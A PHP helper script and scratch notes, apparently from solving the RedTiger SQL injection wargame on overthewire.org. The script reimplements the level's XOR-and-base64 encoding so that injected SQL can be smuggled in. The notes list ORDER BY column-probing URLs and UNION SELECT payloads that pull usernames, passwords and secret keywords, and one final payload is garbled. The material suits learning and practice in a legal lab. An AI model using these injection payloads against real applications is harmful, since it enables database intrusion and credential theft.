<?php

	// warning! ugly code ahead :)
	// requires php5.x, sorry for that
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}

    //echo(encrypt('\' union select 1,username,3,4,5,password,7 from level3_users where username=\'Admin\'#'));
    echo encrypt('Admin\' order by 7 #');
    echo encrypt("MDQyMjExMDE0MTgyMTQwMTY5MjE2MDI0MjA1MTE1MTg1MTUzMDkxMjM5MDI5MDI4MjU1MDg2MTg5MDcz")
 
?>
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 1#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 2#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 3#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 4#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 5#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 6#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 7#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 8#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 9#
https://redtiger.labs.overthewire.org/level4.php?id=1'ORDER BY 10#
https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,username,password FROM level1_users#

Get the value of the first entry in table level4_secret in column keyword
1 UNION SELECT 1, keyword from level4_secret#
1 UNION SELECT keyword, 2 from level4_secret#

https://redtiger.labs.overthewire.org/level6.php?user=7 UNION SELECT 1,username,3,password,5 FROM level6_users WHERE status=1#
8 union select 1,UNION SELECT 1,username,3,password,5 FROM level6_users WHERE status=1,3,4,5 from level6_users where status=1 #